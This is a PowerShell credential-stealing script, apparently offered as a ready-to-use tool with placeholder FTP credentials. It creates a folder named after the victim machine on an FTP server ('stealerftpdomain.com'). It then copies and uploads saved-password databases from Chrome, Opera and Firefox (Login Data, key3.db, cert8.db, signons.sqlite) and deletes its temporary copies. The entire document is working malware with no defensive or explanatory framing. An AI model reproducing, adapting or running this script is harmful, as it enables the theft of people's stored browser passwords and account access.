$ftp = "stealerftpdomain.com/USERS/"
$Username = "YOUR_FTP_USERNAME"
$Password = "YOUR_FTP_PASSWORD"
$newFolder = "ftp://"+$ftp+$env:COMPUTERNAME
$Date = Get-Date -format d.M.yyyy
$Hour = Get-Date -format HH.mm.ss

	$makeDirectory = [System.Net.WebRequest]::Create($newFolder);
	$makeDirectory.Credentials = New-Object System.Net.NetworkCredential($Username,$Password);
	$makeDirectory.Method = [System.Net.WebRequestMethods+FTP]::MakeDirectory;
	$makeDirectory.GetResponse();
	"Directorio creado"
	
	# Chrome Uploader
	foreach ($file in Get-ChildItem "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data" -Filter "Login Data" -Recurse | % { $_.FullName }) {
	"Ruta Chrome $file"
	Copy-Item $file $file"2"
	# We add entropy cause Chrome pass file always has the same name "Login Data" and only one of them will be uploaded, or find more than one profile too
	$Entropy = Get-Random -maximum 9999999
	$webclient = New-Object System.Net.WebClient
	$Uri = New-Object System.Uri("ftp://"+"$Username"+":"+"$Password"+"@"+$ftp+$env:COMPUTERNAME+"/Date_"+$Date+"-Hour_"+$Hour+"-"+$Entropy+"-Chrome_Login Data")
	$webclient.UploadFile($Uri, $file+"2")
	$file+"2" | Remove-Item -force
  }
	
  # Firefox Uploader
	foreach ($file in Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\" -Filter "key3.db" -Recurse | % { $_.FullName }) {
	"Ruta Firefox $file"
	Copy-Item $file $file"2"
	# We add entropy cause we can find more than one firefox profile
	$Entropy = Get-Random -maximum 9999999
	$webclient = New-Object System.Net.WebClient
	$Uri = New-Object System.Uri("ftp://"+"$Username"+":"+"$Password"+"@"+$ftp+$env:COMPUTERNAME+"/Date_"+$Date+"-Hour_"+$Hour+"-"+$Entropy+"-Firefox.key3.db")
	$webclient.UploadFile($Uri, $file+"2")
	$file+"2" | Remove-Item -force

	# Remove key3.db from URI
	$file = $file.Substring(0,$file.Length-7)

	# Add next pass file to URI
	$file = $file+"cert8.db"
	Copy-Item $file $file"2"
	"Ruta Firefox $file"
	$Uri = New-Object System.Uri("ftp://"+"$Username"+":"+"$Password"+"@"+$ftp+$env:COMPUTERNAME+"/Date_"+$Date+"-Hour_"+$Hour+"-"+$Entropy+"-Firefox.cert8.db")
	$webclient.UploadFile($Uri, $file+"2")
	$file+"2" | Remove-Item -force
	
	# Remove cert8.db from URI
	$file = $file.Substring(0,$file.Length-8)
	
	# Add next pass file to URI
	$file = $file+"signons.sqlite"
	Copy-Item $file $file"2"
	"Ruta Firefox $file"
	$Uri = New-Object System.Uri("ftp://"+"$Username"+":"+"$Password"+"@"+$ftp+$env:COMPUTERNAME+"/Date_"+$Date+"-Hour_"+$Hour+"-"+$Entropy+"-Firefox.signons.sqlite")
	$webclient.UploadFile($Uri, $file+"2")
	$file+"2" | Remove-Item -force
  }

	# Opera Uploader
	foreach ($file in Get-ChildItem "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable" -Filter "Login Data" -Recurse | % { $_.FullName }) {
	"Ruta Opera $file"
	Copy-Item $file $file"2"
	# We add entropy cause Opera pass file always has the same name "Login Data" and only one of them will be uploaded, or find more than one profile too
	$Entropy = Get-Random -maximum 9999999
	$webclient = New-Object System.Net.WebClient
	$Uri = New-Object System.Uri("ftp://"+"$Username"+":"+"$Password"+"@"+$ftp+$env:COMPUTERNAME+"/Date_"+$Date+"-Hour_"+$Hour+"-"+$Entropy+"-Opera_Login Data")
	$webclient.UploadFile($Uri, $file+"2")
	$file+"2" | Remove-Item -force
  }